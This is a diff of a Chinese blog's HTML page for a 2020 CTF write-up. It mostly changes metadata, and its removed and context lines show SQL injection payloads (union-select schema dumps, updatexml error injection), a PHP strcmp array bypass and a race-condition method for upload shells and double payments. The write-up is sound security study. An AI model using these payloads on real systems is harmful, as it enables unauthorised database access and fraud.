@@ -1,65 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='由中国计量大学现代科技学院主办的比赛。
- easyweb 源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过
-?password[]=shit成绩单 白给题，Union注入无任何过滤，上来直接一血
-id=-1&#39; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#//fl4g,scid=-1&#39; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;fl4g&#39;#//flagid=-1&#39; union select 1,flag,3,4 from fl4g#//flag{Sql_INJECT0N_4813drd8hz4}shop 考点：条件竞争
-说实话一开始以为是逻辑漏洞，尝试了半天没搞出来，想到了条件竞争但是因为爆破的时候线程设置的不够高，所以没搞出来，时候来又尝试了一次才想到。
-什么是条件竞争 参考：https://www.jianshu.com/p/09d0eb938e6a
-竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。
-开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。
-线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。
-两个例子 例1：金额提现 假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。
-例2：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”
-攻击：首先上传一个php文件
-当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。
-回到题目 打开题目，显示账户剩余20元，flag需要21元，然后你可以输入小于等于20元的金额，另外有个重置按钮
-思路就是分别抓两个包，一个不停的支付20元，一个不停的重置，在高并发的情况下服务器响应不过来就可以造成支付两次
-注意事项就是支付金额最好是10元以上，如果是一两元的话，就不能和另外一个包形成竞争还有就是线程要多
-POST / HTTP/1.1Host: aaaed42d.yunyansec.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.'><title>中计量现科CTF竞赛</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='由中国计量大学现代科技学院主办的比赛。'><title>中计量现科CTF竞赛</title>
 
 <link rel='canonical' href='https://anthem-whisper.github.io/p/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/'>
 
 <link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='中计量现科CTF竞赛'>
-<meta property='og:description' content='由中国计量大学现代科技学院主办的比赛。
- easyweb 源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过
-?password[]=shit成绩单 白给题，Union注入无任何过滤，上来直接一血
-id=-1&#39; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#//fl4g,scid=-1&#39; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;fl4g&#39;#//flagid=-1&#39; union select 1,flag,3,4 from fl4g#//flag{Sql_INJECT0N_4813drd8hz4}shop 考点：条件竞争
-说实话一开始以为是逻辑漏洞，尝试了半天没搞出来，想到了条件竞争但是因为爆破的时候线程设置的不够高，所以没搞出来，时候来又尝试了一次才想到。
-什么是条件竞争 参考：https://www.jianshu.com/p/09d0eb938e6a
-竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。
-开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。
-线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。
-两个例子 例1：金额提现 假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。
-例2：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”
-攻击：首先上传一个php文件
-当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。
-回到题目 打开题目，显示账户剩余20元，flag需要21元，然后你可以输入小于等于20元的金额，另外有个重置按钮
-思路就是分别抓两个包，一个不停的支付20元，一个不停的重置，在高并发的情况下服务器响应不过来就可以造成支付两次
-注意事项就是支付金额最好是10元以上，如果是一两元的话，就不能和另外一个包形成竞争还有就是线程要多
-POST / HTTP/1.1Host: aaaed42d.yunyansec.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.'>
+<meta property='og:description' content='由中国计量大学现代科技学院主办的比赛。'>
 <meta property='og:url' content='https://anthem-whisper.github.io/p/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/'>
 <meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='二次注入' /><meta property='article:tag' content='条件竞争' /><meta property='article:published_time' content='2020-06-21T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-06-21T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="中计量现科CTF竞赛">
-<meta name="twitter:description" content="由中国计量大学现代科技学院主办的比赛。
- easyweb 源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过
-?password[]=shit成绩单 白给题，Union注入无任何过滤，上来直接一血
-id=-1&#39; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#//fl4g,scid=-1&#39; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;fl4g&#39;#//flagid=-1&#39; union select 1,flag,3,4 from fl4g#//flag{Sql_INJECT0N_4813drd8hz4}shop 考点：条件竞争
-说实话一开始以为是逻辑漏洞，尝试了半天没搞出来，想到了条件竞争但是因为爆破的时候线程设置的不够高，所以没搞出来，时候来又尝试了一次才想到。
-什么是条件竞争 参考：https://www.jianshu.com/p/09d0eb938e6a
-竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。
-开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。
-线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。
-两个例子 例1：金额提现 假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。
-例2：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”
-攻击：首先上传一个php文件
-当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。
-回到题目 打开题目，显示账户剩余20元，flag需要21元，然后你可以输入小于等于20元的金额，另外有个重置按钮
-思路就是分别抓两个包，一个不停的支付20元，一个不停的重置，在高并发的情况下服务器响应不过来就可以造成支付两次
-注意事项就是支付金额最好是10元以上，如果是一两元的话，就不能和另外一个包形成竞争还有就是线程要多
-POST / HTTP/1.1Host: aaaed42d.yunyansec.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.">
+<meta name="twitter:description" content="由中国计量大学现代科技学院主办的比赛。">
     </head>
     <body class="">
     <script>
@@ -234,17 +186,38 @@ POST / HTTP/1.1Host: aaaed42d.yunyansec.comUser-Agent: Mozilla/5.0 (Windows NT
 
     <div class="article-details">
     
+    <header class="article-category">
+        
+            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
+                CTF writeup
+            </a>
+        
+    </header>
+    
 
     <h2 class="article-title">
         <a href="/p/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/">中计量现科CTF竞赛</a>
     </h2>
 
-    </div>
+    
+    <h3 class="article-subtitle">
+        由中国计量大学现代科技学院主办的比赛。
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 21, 2020</time>
+    </footer></div>
 </header>
 
     <section class="article-content">
-    <p>由中国计量大学现代科技学院主办的比赛。</p>
-<hr>
+    <hr>
 <h3 id="easyweb">easyweb</h3>
 <p>源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过</p>
 <pre><code>?password[]=shit
@@ -333,6 +306,14 @@ abc&quot;||updatexml(2,concat(0x7e,(select(flag)from(flag))),0)#
 
     <footer class="article-footer">
     
+    <section class="article-tags">
+        
+            <a href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">二次注入</a>
+        
+            <a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a>
+        
+    </section>
+
 
     
     <section class="article-copyright">
@@ -353,6 +334,91 @@ abc&quot;||updatexml(2,concat(0x7e,(select(flag)from(flag))),0)#
 
     <aside class="related-contents--wrapper">
     
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/hgame-2021-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HGAME 2021 Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/starctf-2021-%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100314.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100314.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">starCTF 2021 复现</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">纵横杯 Writeup by X1cT34m</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/roarctf-2020/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RoarCTF 2020</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181429.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181429.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">0xGame2020出题笔记</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
     
 </aside>
 
